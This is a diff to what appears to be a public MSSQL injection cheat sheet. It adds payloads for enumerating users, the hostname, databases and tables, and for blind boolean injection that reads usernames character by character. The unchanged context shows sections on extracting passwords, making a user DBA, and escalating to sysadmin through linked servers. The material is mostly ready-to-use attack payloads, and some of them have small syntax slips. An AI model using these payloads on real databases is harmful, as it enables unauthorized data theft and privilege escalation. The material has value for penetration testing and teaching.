@@ -2,9 +2,11 @@
 
 ## Summary
 
-* [MSSQL comments](#mssql-comments)
-* [MSSQL version](#mssql-version)
-* [MSSQL database name](#mssql-database-name)
+* [MSSQL Comments](#mssql-comments)
+* [MSSQL User](#mssql-user)
+* [MSSQL Version](#mssql-version)
+* [MSSQL Hostname](#mssql-hostname)
+* [MSSQL Database name](#mssql-database-name)
 * [MSSQL List databases](#mssql-list-databases)
 * [MSSQL List columns](#mssql-list-columns)
 * [MSSQL List tables](#mssql-list-tables)
@@ -22,7 +24,7 @@
 * [MSSQL Make user DBA](#mssql-make-user-dba-db-admin)
 * [MSSQL Trusted Links](#mssql-trusted-links)
 
-## MSSQL comments
+## MSSQL Comments
 
 ```sql
 -- comment goes here
@@ -33,6 +35,9 @@
 
 ```sql
 SELECT CURRENT_USER
+SELECT user_name();
+SELECT system_user;
+SELECT user;
 ```
 
 ## MSSQL version
@@ -41,7 +46,14 @@ SELECT CURRENT_USER
 SELECT @@version
 ```
 
-## MSSQL database name
+## MSSQL Hostname
+
+```sql
+SELECT HOST_NAME()
+SELECT @@hostname;
+```
+
+## MSSQL Database name
 
 ```sql
 SELECT DB_NAME()
@@ -52,6 +64,7 @@ SELECT DB_NAME()
 ```sql
 SELECT name FROM master..sysdatabases;
 SELECT DB_NAME(N); — for N = 0, 1, 2, …
+SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb   (Only works in MSSQL 2017+)
 ```
 
 ## MSSQL List columns
@@ -71,6 +84,7 @@ SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
 SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
 
 SELECT table_catalog, table_name FROM information_schema.columns
+SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
 ```
 
 ## MSSQL Extract user/password
@@ -122,6 +136,13 @@ For string inputs   : ' + cast((SELECT @@version) as int) + '
 ## MSSQL Blind based
 
 ```sql
+AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
+
+AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
+AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
+
+AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
+
 SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
 
 WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
@@ -284,3 +305,4 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 * [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
 * [DAFT: Database Audit Framework & Toolkit - NetSPI](https://github.com/NetSPI/DAFT)
 * [SQL Server UNC Path Injection Cheatsheet - nullbind](https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e)
+* [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - 28 January 2009](https://www.exploit-db.com/papers/12975)
